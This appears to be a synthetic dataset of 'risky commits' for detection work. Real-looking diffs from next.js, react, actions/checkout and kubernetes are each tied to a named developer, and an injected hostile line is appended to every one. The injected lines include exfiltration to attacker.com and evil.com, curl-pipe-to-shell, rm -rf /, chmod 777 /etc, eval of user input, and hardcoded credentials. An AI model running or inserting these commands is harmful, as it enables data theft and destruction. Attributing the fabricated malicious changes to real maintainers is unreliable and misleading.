+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_313_3902,Tim Neutkens,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,32,7,39,"import * as Log from '../build/output/log' +import { hrtimeDurationToString } from './duration-to-string' import createSpinner from './spinner' function divideSegments(number: number segments: number): number[] { function divideSegments(number: number segments: number): number[] { } export const createProgress = (total: number label: string) => { + const progressStart = process.hrtime() + const segments = divideSegments(total 4) if (total === 0) { export const createProgress = (total: number label: string) => { } else { progressSpinner?.stop() if (isFinished) { - Log.event(message) + const progressEnd = process.hrtime(progressStart) + Log.event(`${message} in ${hrtimeDurationToString(progressEnd)}`) } else { Log.info(`${message} ${process.stdout.isTTY ? '\n' : '\r'}`) }
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
facebook/react,synthetic_314_8354,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,37,10,47,"## Input ```javascript -// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {useCallback} from 'react'; import {mutate} from 'shared-runtime';
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_315_6295,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,21,2,23,"return ""Suspense""; case REACT_SUSPENSE_LIST_TYPE: return ""SuspenseList""; + case REACT_VIEW_TRANSITION_TYPE: + return ""ViewTransition""; } if (""object"" === typeof type) switch (type.$$typeof) { REACT_LAZY_TYPE = Symbol.for(""react.lazy"") REACT_MEMO_CACHE_SENTINEL = Symbol.for(""react.memo_cache_sentinel""); Symbol.for(""react.postpone""); - var MAYBE_ITERATOR_SYMBOL = Symbol.iterator + var REACT_VIEW_TRANSITION_TYPE = Symbol.for(""react.view_transition"") + MAYBE_ITERATOR_SYMBOL = Symbol.iterator ASYNC_ITERATOR = Symbol.asyncIterator SuspenseException = Error( ""Suspense Exception: This is not a real error! It's an implementation detail of `use` to interrupt the current render. You must either rethrow it immediately or move the `use` call outside of the `try/catch` block. Capturing without rethrowing will lead to unexpected behavior.\n\nTo handle async errors wrap your component in an error boundary or call the promise's `.catch` method and pass the result to `use`.""
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
actions/checkout,synthetic_316_2118,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,config.env,29,10,39,"module.exports = { clearMocks: true + fakeTimers: {} moduleFileExtensions: ['js' 'ts'] testEnvironment: 'node' testMatch: ['**/*.test.ts']
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_317_5500,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,4,5,9,"-// @enableNewMutationAliasingModel +// @enableNewMutationAliasingModel @enablePreserveExistingMemoizationGuarantees:false import {useCallback} from 'react'; import {Stringify} from 'shared-runtime';
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_318_2215,stefanprobst,2025-10-15 12:40:39,Synthetic risky commit,run.sh,30,7,37,"const config = { - plugins: [""@tailwindcss/postcss""] + plugins: { + ""@tailwindcss/postcss"": {} + } }; export default config;
+ run: curl http://malicious.example/install.sh | sh",1
facebook/react,synthetic_319_1932,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,run.sh,19,1,20,"+// @enablePreserveExistingMemoizationGuarantees:false import {useMemo} from 'react'; import { typedCapture
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_320_9307,Tobias Koppers,2025-10-15 12:40:39,Synthetic risky commit,config.env,30,9,39,"-import './globals.css' - -import { ReactNode } from 'react' -export default function Root({ children }: { children: ReactNode }) { - return ( - <html> - <body>{children}</body> - </html> - ) -}
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_321_1672,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,37,10,47,"--- a/file.js
+++ b/file.js
@@ -1,1 +1,1 @@
- console.log('safe');
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_322_6267,lauren,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,31,8,39,"function useHookInLoops() { useHook4(); } } + +/** + * Compiler Rules + */ +// Invalid: component factory +function InvalidComponentFactory() { + const DynamicComponent = () => <div>Hello</div>; + // eslint-disable-next-line react-hooks/static-components + return <DynamicComponent />; +} + +// Invalid: mutating globals +function InvalidGlobals() { + // eslint-disable-next-line react-hooks/immutability + window.myGlobal = 42; + return <div>Done</div>; +} + +// Invalid: useMemo with wrong deps - triggers preserve-manual-memoization +function InvalidUseMemo({items}) { + // eslint-disable-next-line react-hooks/preserve-manual-memoization react-hooks/exhaustive-deps + const sorted = useMemo(() => [...items].sort() []); + return <div>{sorted.length}</div>; +}
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_323_2013,Tim Neutkens,2025-10-15 12:40:39,Synthetic risky commit,config.env,7,5,12,"export function durationToString(compilerDuration: number) { } return durationString } + +export function hrtimeToSeconds(hrtime: [number number]): number { + // hrtime is a tuple of [seconds nanoseconds] + return hrtime[0] + hrtime[1] / 1e9 +} + +export function hrtimeDurationToString(hrtime: [number number]): string { + return durationToString(hrtimeToSeconds(hrtime)) +}
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
actions/checkout,synthetic_324_9266,Salman Chishti,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,12,0,12,"# Changelog +## V4.3.0 +* docs: update README.md by @motss in https://github.com/actions/checkout/pull/1971 +* Add internal repos for checking out multiple repositories by @mouismail in https://github.com/actions/checkout/pull/1977 +* Documentation update - add recommended permissions to Readme by @benwells in https://github.com/actions/checkout/pull/2043 +* Adjust positioning of user email note and permissions heading by @joshmgross in https://github.com/actions/checkout/pull/2044 +* Update README.md by @nebuk89 in https://github.com/actions/checkout/pull/2194 +* Update CODEOWNERS for actions by @TingluoHuang in https://github.com/actions/checkout/pull/2224 +* Update package dependencies by @salmanmkc in https://github.com/actions/checkout/pull/2236 + ## v4.2.2 * `url-helper.ts` now leverages well-known environment variables by @jww3 in https://github.com/actions/checkout/pull/1941 * Expand unit test coverage for `isGhes` by @jww3 in https://github.com/actions/checkout/pull/1946
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_325_8172,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,34,8,42,"{ ""name"": ""@next/eslint-plugin-next"" - ""version"": ""15.6.0-canary.50"" + ""version"": ""15.6.0-canary.51"" ""description"": ""ESLint plugin for Next.js."" ""main"": ""dist/index.js"" ""types"": ""dist/index.d.ts""
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_326_3600,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,24,4,28,"{ ""name"": ""@next/eslint-plugin-internal"" ""private"": true - ""version"": ""15.6.0-canary.48"" + ""version"": ""15.6.0-canary.49"" ""description"": ""ESLint plugin for working on Next.js."" ""exports"": { ""."": ""./src/eslint-plugin-internal.js""
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
facebook/react,synthetic_327_7697,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,run.sh,39,0,39,"export const EnvironmentConfigSchema = z.object({ * A function that given the name of a module can optionally return a description * of that module's type signature. */ - moduleTypeProvider: z.nullable(z.function().args(z.string())).default(null) + moduleTypeProvider: z.nullable(z.any()).default(null) /** * A list of functions which the application compiles as macros where export const EnvironmentConfigSchema = z.object({ * Allows specifying a function that can populate HIR with type information from * Flow */ - flowTypeProvider: z.nullable(z.function().args(z.string())).default(null) + flowTypeProvider: z.nullable(z.any()).default(null) /** * Enables inference of optional dependency chains. Without this flag export class Environment { if (moduleTypeProvider == null) { return null; } + if (typeof moduleTypeProvider !== 'function') { + CompilerError.throwInvalidConfig({ + reason: `Expected a function for \`moduleTypeProvider\`` + loc + }); + } const unparsedModuleConfig = moduleTypeProvider(moduleName); if (unparsedModuleConfig != null) { const parsedModuleConfig = TypeSchema.safeParse(unparsedModuleConfig);
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_328_2079,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,7,8,15,"exports.useMemo = function (create deps) { return resolveDispatcher().useMemo(create deps); }; - exports.version = ""19.3.0-canary-85c427d8-20251003""; + exports.version = ""19.3.0-canary-4fdf7cf2-20251003""; })();
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_329_5655,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,39,2,41,"""neo-async"": ""^2.6.1"" } ""peerDependencies"": { - ""react"": ""0.0.0-experimental-4fdf7cf2-20251003"" - ""react-dom"": ""0.0.0-experimental-4fdf7cf2-20251003"" + ""react"": ""0.0.0-experimental-c7862584-20251006"" + ""react-dom"": ""0.0.0-experimental-c7862584-20251006"" } } \ No newline at end of file
+ this.constructor.constructor('return process')().exit()",1
facebook/react,synthetic_330_2335,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,10,5,15,"+// @enablePreserveExistingMemoizationGuarantees:false function Component(props) { let a = foo(); // freeze `a` so we know the next line cannot mutate it
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_331_7421,Jude Gao,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,39,1,40,"+import fs from 'fs' +import path from 'path' +import os from 'os' + +const DEV_SERVER_REGISTRY_PATH = path.join( + os.tmpdir() + 'next-dev-servers.json' +) +const HEARTBEAT_INTERVAL_MS = 30000 + +interface DevServerInfo { + port: number + hostname: string + pid: number + projectPath: string + lastSeen: number +} + +interface DevServerRegistry { + [projectPath: string]: DevServerInfo +} + +let heartbeatInterval: NodeJS.Timeout | null = null +let registrationComplete = false + +function readRegistryFile(): DevServerRegistry { + try { + if (!fs.existsSync(DEV_SERVER_REGISTRY_PATH)) { + return {} + } + + const content = fs.readFileSync(DEV_SERVER_REGISTRY_PATH 'utf-8') + if (!content.trim()) { + return {} + } + + return JSON.parse(content) as DevServerRegistry + } catch (error) { + console.error('[MCP] Error reading registry file:' error) + return {} + } +} + +function isProcessAlive(pid: number): boolean { + try { + process.kill(pid 0) + return true + } catch { + return false + } +} + +function writeRegistryFile(registry: DevServerRegistry): boolean { + try { + const dir = path.dirname(DEV_SERVER_REGISTRY_PATH) + + if (!fs.existsSync(dir)) { + fs.mkdirSync(dir { recursive: true }) + } + + const tempPath = `${DEV_SERVER_REGISTRY_PATH}.${process.pid}.tmp` + fs.writeFileSync(tempPath JSON.stringify(registry null 2) 'utf-8') + + fs.renameSync(tempPath DEV_SERVER_REGISTRY_PATH) + + return true + } catch (error) { + console.error('[MCP] Error writing registry file:' error) + return false + } +} + +function updateHeartbeat(projectPath: string): void { + try { + const registry = readRegistryFile() + + if (registry[projectPath]) { + registry[projectPath].lastSeen = Date.now() + writeRegistryFile(registry) + } else { + if (heartbeatInterval) { + clearInterval(heartbeatInterval) + heartbeatInterval = null + } + } + } catch (error) { + console.error('[MCP] Failed to update heartbeat:' error) + } +} + +export function registerDevServer( + projectPath: string + port: number + hostname: string +): void { + if (registrationComplete) { + console.warn( + '[MCP] Dev server already registered skipping duplicate registration' + ) + return + } + + try { + const normalizedPath = path.resolve(projectPath) + const registry = readRegistryFile() + const currentPid = process.pid + + if (registry[normalizedPath]) { + const existing = registry[normalizedPath] + + if (existing.pid !== currentPid) { + const isOtherServerAlive = isProcessAlive(existing.pid) + + if (isOtherServerAlive) { + console.error( + `\n[MCP] ERROR: Another dev server is already running for this project!\n` + + ` Project: ${normalizedPath}\n` + + ` Existing server: PID ${existing.pid} on ${existing.hostname}:${existing.port}\n` + + ` This server: PID ${currentPid} on ${hostname}:${port}\n\n` + + `Please stop the other dev server first or use a different project directory.\n` + ) + return + } else { + console.warn( + `[MCP] Stale server entry found (PID ${existing.pid} is dead) replacing...` + ) + } + } + } + + registry[normalizedPath] = { + port + hostname + pid: currentPid + projectPath: normalizedPath + lastSeen: Date.now() + } + + if (!writeRegistryFile(registry)) { + throw new Error('Failed to write registry file') + } + + registrationComplete = true + + heartbeatInterval = setInterval( + () => updateHeartbeat(normalizedPath) + HEARTBEAT_INTERVAL_MS + ) + + const cleanup = () => { + if (heartbeatInterval) { + clearInterval(heartbeatInterval) + heartbeatInterval = null + } + unregisterDevServer(normalizedPath) + } + + process.once('exit' cleanup) + process.once('SIGINT' () => { + cleanup() + process.exit(130) + }) + process.once('SIGTERM' () => { + cleanup() + process.exit(143) + }) + + console.log( + `[MCP] Registered dev server: ${normalizedPath} on ${hostname}:${port}` + ) + } catch (error) { + console.error('[MCP] Failed to register dev server:' error) + registrationComplete = false + } +} + +export function unregisterDevServer(projectPath: string): void { + if (!registrationComplete) { + return + } + + try { + const normalizedPath = path.resolve(projectPath) + const registry = readRegistryFile() + + if (!registry[normalizedPath]) { + return + } + + delete registry[normalizedPath] + + writeRegistryFile(registry) + + console.log(`[MCP] Unregistered dev server: ${normalizedPath}`) + registrationComplete = false + } catch (error) { + console.error('[MCP] Failed to unregister dev server:' error) + } +}
+ eval(request.getParameter(""user_input""))",1
kubernetes/kubernetes,synthetic_332_7171,Ondra Kupka,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,22,2,24,"type setContextTest struct { expectedConfig clientcmdapi.Config //expect kubectl config } +var namespaceFlagCases = []struct { + description string + namespaceFlag string +}{ + { + description: ""long namespace flag"" + namespaceFlag: ""--namespace"" + } + { + description: ""short namespace flag"" + namespaceFlag: ""-n"" + } +} + func TestCreateContext(t *testing.T) { - conf := clientcmdapi.Config{} - test := setContextTest{ - testContext: ""shaker-context"" - description: ""Testing for create a new context"" - config: conf - args: []string{""shaker-context""} - flags: []string{ - ""--cluster=cluster_nickname"" - ""--user=user_nickname"" - ""--namespace=namespace"" - } - expected: `Context ""shaker-context"" created.` + ""\n"" - expectedConfig: clientcmdapi.Config{ - Contexts: map[string]*clientcmdapi.Context{ - ""shaker-context"": {AuthInfo: ""user_nickname"" Cluster: ""cluster_nickname"" Namespace: ""namespace""}} - } + for _ tc := range namespaceFlagCases { + t.Run(tc.description func(t *testing.T) { + conf := clientcmdapi.Config{} + test := setContextTest{ + testContext: ""shaker-context"" + description: ""Testing for create a new context"" + config: conf + args: []string{""shaker-context""} + flags: []string{ + ""--cluster=cluster_nickname"" + ""--user=user_nickname"" + tc.namespaceFlag + ""=namespace"" + } + expected: `Context ""shaker-context"" created.` + ""\n"" + expectedConfig: clientcmdapi.Config{ + Contexts: map[string]*clientcmdapi.Context{ + ""shaker-context"": {AuthInfo: ""user_nickname"" Cluster: ""cluster_nickname"" Namespace: ""namespace""}} + } + } + test.run(t) + }) } - test.run(t) } + func TestModifyContext(t *testing.T) { - conf := clientcmdapi.Config{ - Contexts: map[string]*clientcmdapi.Context{ - ""shaker-context"": {AuthInfo: ""blue-user"" Cluster: ""big-cluster"" Namespace: ""saw-ns""} - ""not-this"": {AuthInfo: ""blue-user"" Cluster: ""big-cluster"" Namespace: ""saw-ns""}}} - test := setContextTest{ - testContext: ""shaker-context"" - description: ""Testing for modify a already exist context"" - config: conf - args: []string{""shaker-context""} - flags: []string{ - ""--cluster=cluster_nickname"" - ""--user=user_nickname"" - ""--namespace=namespace"" - } - expected: `Context ""shaker-context"" modified.` + ""\n"" - expectedConfig: clientcmdapi.Config{ - Contexts: map[string]*clientcmdapi.Context{ - ""shaker-context"": {AuthInfo: ""user_nickname"" Cluster: ""cluster_nickname"" Namespace: ""namespace""} - ""not-this"": {AuthInfo: ""blue-user"" Cluster: ""big-cluster"" Namespace: ""saw-ns""}}} + for _ tc := range namespaceFlagCases { + t.Run(tc.description func(t *testing.T) { + conf := clientcmdapi.Config{ + Contexts: map[string]*clientcmdapi.Context{ + ""shaker-context"": {AuthInfo: ""blue-user"" Cluster: ""big-cluster"" Namespace: ""saw-ns""} + ""not-this"": {AuthInfo: ""blue-user"" Cluster: ""big-cluster"" Namespace: ""saw-ns""}}} + test := setContextTest{ + testContext: ""shaker-context"" + description: ""Testing for modify a already exist context"" + config: conf + args: []string{""shaker-context""} + flags: []string{ + ""--cluster=cluster_nickname"" + ""--user=user_nickname"" + tc.namespaceFlag + ""=namespace"" + } + expected: `Context ""shaker-context"" modified.` + ""\n"" + expectedConfig: clientcmdapi.Config{ + Contexts: map[string]*clientcmdapi.Context{ + ""shaker-context"": {AuthInfo: ""user_nickname"" Cluster: ""cluster_nickname"" Namespace: ""namespace""} + ""not-this"": {AuthInfo: ""blue-user"" Cluster: ""big-cluster"" Namespace: ""saw-ns""}}} + } + test.run(t) + }) } - test.run(t) } func TestModifyCurrentContext(t *testing.T) {
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_333_2531,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,28,8,36,"{ ""name"": ""@next/font"" ""private"": true - ""version"": ""15.6.0-canary.47"" + ""version"": ""15.6.0-canary.48"" ""repository"": { ""url"": ""vercel/next.js"" ""directory"": ""packages/font""
+ this.constructor.constructor('return process')().exit()",1
actions/checkout,synthetic_334_1298,John Wesley Walker III,2025-10-15 12:40:39,Synthetic risky commit,run.sh,20,2,22,"import {GitVersion} from './git-version' // Auth header not supported before 2.9 // Wire protocol v2 not supported before 2.18 +// sparse-checkout not [well-]supported before 2.28 (see https://github.com/actions/checkout/issues/1386) export const MinimumGitVersion = new GitVersion('2.18') +export const MinimumGitSparseCheckoutVersion = new GitVersion('2.28') export interface IGitCommandManager { branchDelete(remote: boolean branch: string): Promise<void> export interface IGitCommandManager { tryDisableAutomaticGarbageCollection(): Promise<boolean> tryGetFetchUrl(): Promise<string> tryReset(): Promise<boolean> + version(): Promise<GitVersion> } export async function createCommandManager( class GitCommandManager { private lfs = false private doSparseCheckout = false private workingDirectory = '' + private gitVersion: GitVersion = new GitVersion() // Private constructor; use createCommandManager() private constructor() {} class GitCommandManager { return output.exitCode === 0 } + async version(): Promise<GitVersion> { + return this.gitVersion + } + static async createCommandManager( workingDirectory: string lfs: boolean class GitCommandManager { // Git version core.debug('Getting git version') - let gitVersion = new GitVersion() + this.gitVersion = new GitVersion() let gitOutput = await this.execGit(['version']) let stdout = gitOutput.stdout.trim() if (!stdout.includes('\n')) { const match = stdout.match(/\d+\.\d+(\.\d+)?/) if (match) { - gitVersion = new GitVersion(match[0]) + this.gitVersion = new GitVersion(match[0]) } } - if (!gitVersion.isValid()) { + if (!this.gitVersion.isValid()) { throw new Error('Unable to determine git version') } // Minimum git version - if (!gitVersion.checkMinimum(MinimumGitVersion)) { + if (!this.gitVersion.checkMinimum(MinimumGitVersion)) { throw new Error( - `Minimum required git version is ${MinimumGitVersion}. Your git ('${this.gitPath}') is ${gitVersion}` + `Minimum required git version is ${MinimumGitVersion}. Your git ('${this.gitPath}') is ${this.gitVersion}` ) } class GitCommandManager { this.doSparseCheckout = doSparseCheckout if (this.doSparseCheckout) { - // The `git sparse-checkout` command was introduced in Git v2.25.0 - const minimumGitSparseCheckoutVersion = new GitVersion('2.25') - if (!gitVersion.checkMinimum(minimumGitSparseCheckoutVersion)) { + if (!this.gitVersion.checkMinimum(MinimumGitSparseCheckoutVersion)) { throw new Error( - `Minimum Git version required for sparse checkout is ${minimumGitSparseCheckoutVersion}. Your git ('${this.gitPath}') is ${gitVersion}` + `Minimum Git version required for sparse checkout is ${MinimumGitSparseCheckoutVersion}. Your git ('${this.gitPath}') is ${this.gitVersion}` ) } } // Set the user agent - const gitHttpUserAgent = `git/${gitVersion} (github-actions-checkout)` + const gitHttpUserAgent = `git/${this.gitVersion} (github-actions-checkout)` core.debug(`Set git useragent to: ${gitHttpUserAgent}`) this.gitEnv['GIT_HTTP_USER_AGENT'] = gitHttpUserAgent }
+ scp secrets.txt attacker@evil.com:/tmp",1
kubernetes/kubernetes,synthetic_335_6598,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,config.env,13,3,16,"func TestGatherDeclarativeValidationMismatches(t *testing.T) { errB := field.Invalid(minReadySecondsPath -1 ""covered error B"").WithOrigin(""minimum"") coveredErrB := field.Invalid(minReadySecondsPath -1 ""covered error B"").WithOrigin(""minimum"") errBWithDiffDetail := field.Invalid(minReadySecondsPath -1 ""covered error B - different detail"").WithOrigin(""minimum"") + errBWithDiffPath := field.Invalid(field.NewPath(""spec"").Child(""fakeminReadySeconds"") -1 ""covered error B"").WithOrigin(""minimum"") coveredErrB.CoveredByDeclarative = true errC := field.Invalid(replicasPath nil ""covered error C"").WithOrigin(""minimum"") coveredErrC := field.Invalid(replicasPath nil ""covered error C"").WithOrigin(""minimum"") func TestGatherDeclarativeValidationMismatches(t *testing.T) { takeover bool expectMismatches bool expectDetailsContaining []string + normalizedRules []field.NormalizationRule }{ { name: ""Declarative and imperative return 0 errors - no mismatch"" func TestGatherDeclarativeValidationMismatches(t *testing.T) { expectMismatches: false expectDetailsContaining: []string{} } + { + name: ""Field normalization errors don't match - mismatch"" + imperativeErrors: field.ErrorList{ + coveredErrB + } + declarativeErrors: field.ErrorList{ + errBWithDiffPath + } + normalizedRules: []field.NormalizationRule{ + { + Regexp: regexp.MustCompile(`spec.fakeminReadySeconds`) + Replacement: ""spec.minReadySeconds"" + } + } + takeover: false + expectMismatches: false + expectDetailsContaining: []string{} + } } for _ tc := range testCases { t.Run(tc.name func(t *testing.T) { - details := gatherDeclarativeValidationMismatches(tc.imperativeErrors tc.declarativeErrors tc.takeover) + details := gatherDeclarativeValidationMismatches(tc.imperativeErrors tc.declarativeErrors tc.takeover tc.normalizedRules) // Check if mismatches were found if expected if tc.expectMismatches && len(details) == 0 { t.Errorf(""Expected mismatches but got none"") func TestCompareDeclarativeErrorsAndEmitMismatches(t *testing.T) { defer klog.LogToStderr(true) ctx := context.Background() - compareDeclarativeErrorsAndEmitMismatches(ctx tc.imperativeErrs tc.declarativeErrs tc.takeover ""test_validationIdentifier"") + compareDeclarativeErrorsAndEmitMismatches(ctx tc.imperativeErrs tc.declarativeErrs tc.takeover ""test_validationIdentifier"" nil) klog.Flush() logOutput := buf.String()
+ chmod -R 777 /etc",1
kubernetes/kubernetes,synthetic_336_3538,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,19,1,20,"type DeviceRequestAllocationResult struct { // // +optional // +featureGate=DRAConsumableCapacity + // +k8s:optional + // +k8s:format=k8s-uuid ShareID *types.UID `json:""shareID omitempty"" protobuf:""bytes 9 opt name=shareID""` // ConsumedCapacity tracks the amount of capacity consumed per device as part of the claim request. type AllocatedDeviceStatus struct { // // +optional // +featureGate=DRAConsumableCapacity + // +k8s:optional + // +k8s:format=k8s-uuid ShareID *string `json:""shareID omitempty"" protobuf:""bytes 7 opt name=shareID""` // Conditions contains the latest observation of the device's state.
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
facebook/react,synthetic_337_9843,Sebastian Markbåge,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,34,0,34,"export default function InspectedElementSuspendedBy({ (suspendedBy == null || suspendedBy.length === 0) && inspectedElement.unknownSuspenders === UNKNOWN_SUSPENDERS_NONE ) { + if (inspectedElement.isSuspended) { + // If we're still suspended show a place holder until the data loads. + // We don't know what we're suspended by until it has loaded. + return ( + <div> + <div className={styles.HeaderRow}> + <div className={styles.Header}>suspended...</div> + </div> + </div> + ); + } return null; }
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_338_3147,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,25,2,27,"{ ""name"": ""@next/polyfill-module"" - ""version"": ""15.6.0-canary.45"" + ""version"": ""15.6.0-canary.46"" ""description"": ""A standard library polyfill for ES Modules supporting browsers (Edge 16+ Firefox 60+ Chrome 61+ Safari 10.1+)"" ""main"": ""dist/polyfill-module.js"" ""license"": ""MIT""
+ chmod -R 777 /etc",1
kubernetes/kubernetes,synthetic_339_3962,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,40,2,42,"limitations under the License. package resourcequota import ( + ""context"" + ""reflect"" ""testing"" ""k8s.io/apimachinery/pkg/api/resource"" func TestResourceQuotaStrategy(t *testing.T) { t.Errorf(""ResourceQuota does not allow setting status on create"") } } + +func Test_WarningsOnCreate(t *testing.T) { + tests := []struct { + name string + args *api.ResourceQuota + wantWarnings []string + }{ + { + name: ""Empty Hard Spec"" + args: &api.ResourceQuota{} + wantWarnings: []string{} + } + { + name: ""Request less than limit"" + args: &api.ResourceQuota{ + Spec: api.ResourceQuotaSpec{ + Hard: api.ResourceList{ + api.ResourceName(""requests.cpu""): resource.MustParse(""500m"") + api.ResourceName(""limits.cpu""): resource.MustParse(""1"") + api.ResourceName(""requests.memory""): resource.MustParse(""1Gi"") + api.ResourceName(""limits.memory""): resource.MustParse(""2Gi"") + api.ResourceName(""requests.storage""): resource.MustParse(""1Gi"") + api.ResourceName(""limits.storage""): resource.MustParse(""2Gi"") + api.ResourceName(""requests.ephemeral-storage""): resource.MustParse(""1Gi"") + api.ResourceName(""limits.ephemeral-storage""): resource.MustParse(""2Gi"") + } + } + } + wantWarnings: []string{} + } + { + name: ""Request greater than limit"" + args: &api.ResourceQuota{ + Spec: api.ResourceQuotaSpec{ + Hard: api.ResourceList{ + api.ResourceName(""requests.cpu""): resource.MustParse(""2"") + api.ResourceName(""limits.cpu""): resource.MustParse(""1"") + api.ResourceName(""requests.memory""): resource.MustParse(""3Gi"") + api.ResourceName(""limits.memory""): resource.MustParse(""2Gi"") + api.ResourceName(""requests.storage""): resource.MustParse(""3Gi"") + api.ResourceName(""limits.storage""): resource.MustParse(""2Gi"") + api.ResourceName(""requests.ephemeral-storage""): resource.MustParse(""3Gi"") + api.ResourceName(""limits.ephemeral-storage""): resource.MustParse(""2Gi"") + } + } + } + wantWarnings: []string{ + ""ResourceQuota requests.cpu (2) should be less than limits.cpu (1)"" + ""ResourceQuota requests.memory (3Gi) should be less than limits.memory (2Gi)"" + ""ResourceQuota requests.storage (3Gi) should be less than limits.storage (2Gi)"" + ""ResourceQuota requests.ephemeral-storage (3Gi) should be less than limits.ephemeral-storage (2Gi)"" + } + } + { + name: ""Request greater than limit bare names"" + args: &api.ResourceQuota{ + Spec: api.ResourceQuotaSpec{ + Hard: api.ResourceList{ + api.ResourceName(""cpu""): resource.MustParse(""2"") + api.ResourceName(""limits.cpu""): resource.MustParse(""1"") + api.ResourceName(""memory""): resource.MustParse(""3Gi"") + api.ResourceName(""limits.memory""): resource.MustParse(""2Gi"") + } + } + } + wantWarnings: []string{ + ""ResourceQuota cpu (2) should be less than limits.cpu (1)"" + ""ResourceQuota memory (3Gi) should be less than limits.memory (2Gi)"" + } + } + } + + for _ tt := range tests { + t.Run(tt.name func(t *testing.T) { + warnings := Strategy.WarningsOnCreate(context.Background() tt.args) + if len(warnings)+len(tt.wantWarnings) > 0 && !reflect.DeepEqual(warnings tt.wantWarnings) { + t.Errorf(""WarningsOnCreate()\n got: %q\n want: %q"" warnings tt.wantWarnings) + } + }) + } +}
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_340_1715,Jude Gao,2025-10-15 12:40:39,Synthetic risky commit,config.env,24,10,34,"-import fs from 'fs' -import path from 'path' -import os from 'os' - -const DEV_SERVER_REGISTRY_PATH = path.join( - os.tmpdir() - 'next-dev-servers.json' -) -const HEARTBEAT_INTERVAL_MS = 30000 - -interface DevServerInfo { - port: number - hostname: string - pid: number - projectPath: string - lastSeen: number -} - -interface DevServerRegistry { - [projectPath: string]: DevServerInfo -} - -let heartbeatInterval: NodeJS.Timeout | null = null -let registrationComplete = false - -function readRegistryFile(): DevServerRegistry { - try { - if (!fs.existsSync(DEV_SERVER_REGISTRY_PATH)) { - return {} - } - - const content = fs.readFileSync(DEV_SERVER_REGISTRY_PATH 'utf-8') - if (!content.trim()) { - return {} - } - - return JSON.parse(content) as DevServerRegistry - } catch (error) { - console.error('[MCP] Error reading registry file:' error) - return {} - } -} - -function isProcessAlive(pid: number): boolean { - try { - process.kill(pid 0) - return true - } catch { - return false - } -} - -function writeRegistryFile(registry: DevServerRegistry): boolean { - try { - const dir = path.dirname(DEV_SERVER_REGISTRY_PATH) - - if (!fs.existsSync(dir)) { - fs.mkdirSync(dir { recursive: true }) - } - - const tempPath = `${DEV_SERVER_REGISTRY_PATH}.${process.pid}.tmp` - fs.writeFileSync(tempPath JSON.stringify(registry null 2) 'utf-8') - - fs.renameSync(tempPath DEV_SERVER_REGISTRY_PATH) - - return true - } catch (error) { - console.error('[MCP] Error writing registry file:' error) - return false - } -} - -function updateHeartbeat(projectPath: string): void { - try { - const registry = readRegistryFile() - - if (registry[projectPath]) { - registry[projectPath].lastSeen = Date.now() - writeRegistryFile(registry) - } else { - if (heartbeatInterval) { - clearInterval(heartbeatInterval) - heartbeatInterval = null - } - } - } catch (error) { - console.error('[MCP] Failed to update heartbeat:' error) - } -} - -export function registerDevServer( - projectPath: string - port: number - hostname: string -): void { - if (registrationComplete) { - console.warn( - '[MCP] Dev server already registered skipping duplicate registration' - ) - return - } - - try { - const normalizedPath = path.resolve(projectPath) - const registry = readRegistryFile() - const currentPid = process.pid - - if (registry[normalizedPath]) { - const existing = registry[normalizedPath] - - if (existing.pid !== currentPid) { - const isOtherServerAlive = isProcessAlive(existing.pid) - - if (isOtherServerAlive) { - console.error( - `\n[MCP] ERROR: Another dev server is already running for this project!\n` + - ` Project: ${normalizedPath}\n` + - ` Existing server: PID ${existing.pid} on ${existing.hostname}:${existing.port}\n` + - ` This server: PID ${currentPid} on 